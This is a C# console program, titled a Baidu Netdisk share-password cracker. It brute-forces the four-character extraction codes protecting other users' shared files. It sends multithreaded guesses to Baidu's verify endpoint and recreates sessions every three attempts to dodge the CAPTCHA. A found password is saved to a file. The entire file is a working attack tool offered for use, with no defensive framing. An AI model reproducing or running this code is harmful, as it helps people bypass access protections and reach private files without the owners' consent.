using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace FuckBDPanPwd
{
    class hash
    {
        //哈希类 36进制
        //有效哈希[10000000,11679615]
        static public string Hash2Str(int hash)
        {
            string ret = "";
            hash -= 10000000;
            while (hash > 0)
            {
                ret += Hash2Char(hash % 36);
                hash /= 36;
            }
            if (ret.Length == 3) ret += "0";    //前导零
            if (ret.Length == 2) ret += "00";
            if (ret.Length == 1) ret += "000";
            if (ret.Length == 0) ret += "0000";
            return reverse(ret);
        }
        static public int Str2Hash(string str)
        {
            int ret = 0;
            ret += Char2Hash(str[0]) * 46656;
            ret += Char2Hash(str[1]) * 1296;
            ret += Char2Hash(str[2]) * 36;
            ret += Char2Hash(str[3]);
            ret += 10000000;    //防止前导零
            return ret;
        }
        static private int Char2Hash(char c)
        {
            if (c >= '0' && c <= '9') return c - '0';
            else return c - 'a' + 10;
        }
        static private char Hash2Char(int hash)
        {
            if (hash >= 0 && hash <= 9) return (char)('0' + hash);
            else return (char)('a' + hash - 10);
        }
        static private string reverse(string str)
        {
            char[] arr = str.ToCharArray();
            Array.Reverse(arr);
            return new string(arr);
        }
    }
    class crack
    {
        //URL格式必须严格为http://pan.baidu.com/share/init?shareid=xxx&uk=xxx
        public void init(string url)
        {
            HttpGet(url);
            info = url.Replace("http://pan.baidu.com/share/init?", "");
        }
        //尝试密码，3次后请重新建立实例（否则会有验证码）
        public int trypwd(string pwd)
        {
            System.DateTime time = System.DateTime.Now;
            System.DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(new System.DateTime(1970, 1, 1, 0, 0, 0, 0));
            long ts = (time.Ticks - startTime.Ticks) / 10000;
            string data = HttpPost("http://pan.baidu.com/share/verify?" + info + "&t=" + ts.ToString() + "&bdstoken=null&channel=chunlei&clienttype=0&web=1&app_id=123456&logid=MTUwMTEyNDM2OTY5MzAuOTE5NTU5NjQwMTk0NDM0OA==", "pwd=" + pwd + "&vcode=&vcode_str=");
            if (data.Contains("\"errno\":-9")) return 0;
            else if (data.Contains("\"errno\":0")) return 1;
            else return -1;
        }
        private string HttpPost(string Url, string Data)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "http://pan.baidu.com/share/init?" + info;
                request.ContentLength = Encoding.UTF8.GetByteCount(Data);
                request.CookieContainer = cookie;
                Stream myRequestStream = request.GetRequestStream();
                byte[] postBytes = Encoding.UTF8.GetBytes(Data);
                myRequestStream.Write(postBytes, 0, postBytes.Length);

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                response.Cookies = cookie.GetCookies(response.ResponseUri);
                Stream myResponseStream = response.GetResponseStream();
                StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                string retString = myStreamReader.ReadToEnd();
                myStreamReader.Close();
                myResponseStream.Close();

                return retString;
            }
            catch (System.Exception ex)
            {
                return "error";
            }
        }
        private string HttpGet(string Url)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
            request.Method = "GET";
            request.ContentType = "text/html;charset=UTF-8";
            request.CookieContainer = cookie;

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream myResponseStream = response.GetResponseStream();
            StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
            string retString = myStreamReader.ReadToEnd();
            myStreamReader.Close();
            myResponseStream.Close();

            return retString;
        }

        private CookieContainer cookie = new CookieContainer();
        private string info;
    }
    class Program
    {
        struct pos
        {
            public pos(int n,string u,int f,int t)
            {
                num = n;
                url = u;
                from = f;
                to = t;
            }
            public int num;
            public string url;
            public int from;
            public int to;
        }
        static void fuck(object data)
        {
            pos para = (pos)data;
            int cnt = 0;
            int now = 0;
            crack fk = new crack();
            for (int i = para.from; i <= para.to;)
            {
                if (ans != 0) break;
                Thread.Sleep(delay);
                fk.init(para.url);
                int res = fk.trypwd(hash.Hash2Str(i));
                //Console.WriteLine("线程" + para.num + "：" + i + " " + hash.Hash2Str(i) + " " + res);
                if (res == -1) Console.WriteLine("线程" + para.num + "：网络错误！重试中……");
                else if (res == 0)
                {
                    ++i;
                    if ((int)(((double)(i - para.from + 1) / (para.to - para.from + 1)) * 100) - now > 10)
                    {
                        now = (int)(((double)(i - para.from + 1) / (para.to - para.from + 1)) * 100);
                        if (now > 100) now = 100;
                        Console.WriteLine("线程" + para.num + "：" + now + "%");
                    }
                }
                else
                {
                    ans = i;
                    using (StreamWriter sw = new StreamWriter("pwd.txt"))
                        sw.WriteLine(hash.Hash2Str(ans));
                    break;
                }
                ++cnt;
                if (cnt == 3)
                {
                    fk = new crack();
                    cnt = 0;
                }
            }
            Console.WriteLine("线程" + para.num + "退出...");
        }
        static void Main(string[] args)
        {
            Console.WriteLine("百度网盘分享文件密码破解器 by MXWXZ   最后测试于2017年7月27日");
            Console.WriteLine("请粘贴目标网址，必须严格遵循格式！按回车键确认...\n例（xxx为数字）：http://pan.baidu.com/share/init?shareid=xxx&uk=xxx");
            string url = Console.ReadLine();
            Console.WriteLine("请输入密码开始点(例如：0000)，按回车键确认：");
            int start = hash.Str2Hash(Console.ReadLine());
            Console.WriteLine("请输入密码结束点(例如：zzzz)，按回车键确认：");
            int end = hash.Str2Hash(Console.ReadLine());
            Console.WriteLine("请输入延时毫秒数，按回车键确认（建议不低于100）：");
            delay = Convert.ToInt32(Console.ReadLine());
            Console.WriteLine("请输入线程数，按回车键确认（建议不超过200）：");
            int num = Convert.ToInt32(Console.ReadLine());
            int everythread = (end - start + 1) / num;
            Console.WriteLine("共" + (end - start + 1) + "个密码，每个线程预计至少尝试" + everythread + "次密码...");
            Console.WriteLine("按任意键开始...");
            Console.ReadKey(true);
            Console.WriteLine("启动线程中……");
            Thread[] t = new Thread[num + 1];
            int tot = start, left = end - start + 1 - everythread * num;
            for (int i = 1; i <= num; ++i)
            {
                int pls = 0;
                if (left > 0)
                {
                    pls = 1;
                    left--;
                }
                if (i != num) Console.WriteLine("启动线程" + i + "，尝试" + hash.Hash2Str(tot) + "-" + hash.Hash2Str(tot + everythread + pls - 1) + "...");
                else Console.WriteLine("启动线程" + i + "，尝试" + hash.Hash2Str(tot) + "-" + hash.Hash2Str(end) + "...");
                t[i]= new Thread(new ParameterizedThreadStart(fuck));
                t[i].IsBackground = true;
                if (i != num) t[i].Start(new pos(i, url, tot, tot + everythread + pls - 1));
                else t[i].Start(new pos(i, url, tot, end));
                tot = tot + pls + everythread;
            }
            for(bool flg=false;!flg;)
            {
                Thread.Sleep(5000);
                flg = true;
                for(int i = 1; i <= num; ++i)
                {
                    if ((t[i].ThreadState & ThreadState.Stopped) != t[i].ThreadState)
                    {
                        flg = false;
                        break;
                    }
                }
            }
            if (ans != 0)
                Console.WriteLine("密码已找到！Password：" + hash.Hash2Str(ans) + " 已写入pwd.txt文件保存！");
            else
                Console.WriteLine("囧……密码未找到……");
            Console.WriteLine("按任意键退出...");
            Console.ReadKey(true);
        }
        static int ans = 0;
        static int delay = 0;
    }
}
